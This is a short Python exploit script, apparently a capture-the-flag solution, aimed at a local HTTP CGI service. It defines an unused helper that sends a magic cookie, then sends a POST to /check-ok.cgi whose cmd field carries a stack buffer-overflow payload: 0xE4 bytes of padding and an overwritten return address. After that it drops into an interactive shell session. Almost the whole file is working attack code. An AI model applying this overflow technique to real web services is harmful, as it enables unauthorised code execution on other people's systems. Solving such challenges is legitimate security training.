#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()

io: tube = gift.io


def get_invited():
    request = f"GET /getcookie.cgi HTTP/1.1\r\n"
    request += f"Host: 127.0.0.1\r\n"
    request += f"Cookie: ROOT-GOD=Every king's blood will end with a sword"
    # request += f"a" * 0x200
    request += f"\r\n"
    request += f"\r\n"
    request += f"\r\n"
    s(request)
    exit()


# get_invited()

payload = b"a" * 0xE4
# payload += p64(0x401EBC)
payload += p64(0x4032EE)

request = b"POST /check-ok.cgi HTTP/1.1\r\n"
request += b"Host: 127.0.0.1\r\n"
request += b"Content-Type: application/x-www-form-urlencoded\r\n"
request += b"Content-Length: " + i2b(len(payload) + 4)
request += b"\r\n"
request += b"\r\n"
request += b"cmd="
request += payload
request += b"\r\n"
request += b"\r\n"

s(request)


ia()
